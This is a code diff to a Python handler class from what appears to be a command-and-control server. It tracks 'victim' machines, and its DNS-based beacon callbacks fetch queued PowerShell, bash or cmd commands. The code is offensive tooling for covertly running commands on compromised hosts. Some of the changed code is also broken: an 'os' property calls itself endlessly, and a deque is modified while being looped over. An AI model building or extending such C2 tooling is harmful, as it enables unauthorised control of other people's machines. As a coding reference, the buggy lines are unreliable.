@@ -1,7 +1,8 @@
 from socketserver import BaseRequestHandler
 import backend.handlers as handlers
-from datetime import datetime, timedelta
+from datetime import datetime
 from frontend.util.structs import CommandType, Command
+from collections import deque
 
 
 class ProvenanceClientHandler(BaseRequestHandler):
@@ -17,7 +18,8 @@ class ProvenanceClientHandler(BaseRequestHandler):
 
         # Subclass Initialization
         self._hostname = hostname or f"Client_{self._client_count}"
-        self._queued_commands = []
+        self._os = None
+        self._queued_commands = deque()
         self._sent_commands = []
         self._command_count = 0
         self._last_active = None
@@ -25,12 +27,11 @@ class ProvenanceClientHandler(BaseRequestHandler):
 
         # The model that tracks each controlled machine
         # TODO: somehow dynamically assess the protocol (maybe set up multiple ports)
+        self._protocol_handler = None
         if request:
             self._protocol_handler = handler or handlers.dns.DNSHandler(
                 ip=client_address[0], socket=request[1]
             )
-        else:
-            self._protocol_handler = None
 
     def __repr__(self):
         return f"ProvenanceClient{{{self.server[1]}, {self._hostname}}}"
@@ -67,7 +68,7 @@ class ProvenanceClientHandler(BaseRequestHandler):
         _, port = self.client_address
         self._last_active = datetime.now()
         if self._queued_commands:
-            cmd_to_be_sent = self._queued_commands.pop()[:2]
+            cmd_to_be_sent = self._queued_commands.popleft()[:2]
         else:
             cmd_to_be_sent = (CommandType.NOP, "NONE")
         self._protocol_handler.handle_request(self.request, port, cmd_to_be_sent)
@@ -82,7 +83,7 @@ class ProvenanceClientHandler(BaseRequestHandler):
         :param cmd: the command to be sent
         :return: None
         """
-        convert = {"ps": CommandType.PS, "bash":CommandType.BASH, "cmd":CommandType.CMD}
+        convert = {"ps": CommandType.PS, "bash": CommandType.BASH, "cmd": CommandType.CMD}
         command_type = convert[ctype]
         self._queued_commands.append(Command(command_type, cmd, self._command_count))
         self._command_count += 1
@@ -92,15 +93,18 @@ class ProvenanceClientHandler(BaseRequestHandler):
         The server method used to interact with the underyling
         model representing the victim machine. Will queue a
         command to be sent next time the beacon calls back
-        :param ctype: type of command :module: protocolhandler.Commands
-        :param cmd: the command to be sent
+        :param cmd_id: the id of the command to be deleted
         :return: None
         """
-        for i, cmd in enumerate(self._queued_commands):
+        for cmd in self._queued_commands:
             if cmd.uid == cmd_id:
-                self._queued_commands.pop(i)
+                self._queued_commands.remove(cmd)
 
     # Backend Methods for model querying
+
+    @property
+    def os(self):
+        return self.os
 
     @property
     def queued_commands(self):
